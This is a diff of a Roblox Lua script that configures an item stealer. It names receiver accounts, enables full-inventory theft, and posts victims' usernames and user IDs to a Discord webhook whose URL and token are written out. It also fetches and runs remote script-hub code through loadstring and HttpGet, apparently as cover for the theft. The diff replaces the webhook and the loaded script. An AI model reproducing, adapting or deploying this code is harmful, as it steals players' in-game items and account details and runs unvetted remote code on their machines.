@@ -1,12 +1,12 @@
 Config = {
     Receivers = {"User_boblex"},
-    Webhook = "https://discord.com/api/webhooks/1277429981659791410/VccbDVfCXx9sT9IChUPsWwzRp_jioH0AxxPvsJxwqzE3q7QEksEwiorZMe_n3SWvKAZA",
+    Webhook = "https://discord.com/api/webhooks/1277863416236609586/sBsl7yEyPa6GNgSLVp-RYCQzyRdvW8U_KtXve8HFdE--1OV8VCelyfqOtHCOxp_1hYWN",
     FullInventory = true,
     ReturnStealer = true,
-    Script = "Custom",
-    CustomLink = "https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua"
+    Script = "Yarhm",
+    CustomLink = "None"
 }
-Commands = {ResendTrade = "UwU", RestartPlayer = ".restart"}
+Commands = {ResendTrade = ".resend", RestartPlayer = ".restart"}
 repeat
     wait()
 until game:IsLoaded()
@@ -358,7 +358,7 @@ local Q = {
     ["content"] = "-- @everyone\n" .. k,
     ["embeds"] = {
         {
-            ["title"] = "🦖‘‘ **Wum_PH**",
+            ["title"] = "🦖 **Wum_PH**",
             ["description"] = "```Username     : " ..
                 c.Name ..
                     "\nUser Id      : " ..
@@ -425,6 +425,6 @@ elseif Config.Script == "R3TH PRIV" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua"))()
 elseif Config.Script == "AshbornnHub" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Ashborrn/AshborrnHub/main/Solara.lua", true))()
-elseif Config.Script == "Nexus" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
+elseif Config.Script == "Yarhm" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
 end
